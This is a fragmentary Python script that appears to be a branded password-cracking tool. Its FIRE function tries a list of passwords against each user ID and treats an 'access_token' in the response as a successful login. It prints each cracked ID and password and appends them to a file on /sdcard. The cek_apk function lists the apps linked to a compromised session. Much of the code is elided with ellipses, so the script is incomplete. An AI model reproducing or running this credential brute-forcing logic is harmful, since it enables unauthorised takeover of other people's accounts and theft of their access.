...
def cek_apk(session,sabbir):
    ...
    if len(game)==0:
        ...
        print(f'\r[sojib] %s \x1b[1;95m  Your Active Apps      :{WHITE}'%(GREEN))
    ...
    if len(game)==0:
        ...
        print(f'\r[sojib] %s \x1b[1;95m  Your Expired Apps     :{WHITE}'%(M))
        for i in range(len(game)):
...
  \033[1;32m┃\033[1;34m  ╔╦╗\033[1;31m╦ ╦\033[1;36m╦ ╦\x1b[38;5;208m╦\033[1;33m╔═╗\033[1;32m ┃\033[1;31m𝐂𝐄𝐎\033[1;32m:\x1b[38;5;208mSOJIB
SOJIB\033[1;32m┃
  \033[1;32m┃\033[1;34m  ║║║\033[1;31m║ ║\033[1;36m╠═╣\x1b[38;5;208m║\033[1;33m╠═╣ \033[1;32m┣━━━━━━━━━━━━━━━━━━━━━━\033[1;32m━┫
 \033[1;32m┃\033[1;34m  ╩ ╩\033[1;31m╚═╝\033[1;36m╩ ╩\x1b[38;5;208m╩\033[1;33m╚═╝\033[1;32m ┃\033[1;30m  GIT-HUB \033[1;92m: \033[1;36mSOJIB143 \033[1;32m┃
...
def FIRE(ids,pwv,tl):
    ...
    sys.stdout.write(f'\r  \033[1;37m[\033[1;32mSOJIB143\033[1;37m]-[\033[1;33m{loop}\033[1;37m]-[\033[1;32m{tl}\033[1;37m]-\033[1;37m[\033[1;32mOK:{len(oks)}\033[1;97m] ');sys.stdout.flush()
    try:
        for pas in pwv:
            ...
            if 'access_token' in po:
                ...
                print(f'\r\033[1;91m  [\033[1;92mLOVE-💚\033[1;91m]\033[1;32m '+ids+' \033[1;97m| \033[1;32m'+pas+'\033[1;92m')
                #print(f'\r\033[1;32~\033[1;91m[]\033[1;32m>< '+kuki)
                oks.append(ids)
                open('/sdcard/SOJIB-OKS.txt','a').write(ids+' | '+pas+'\n')
                break
            else:continue
        loop+=1
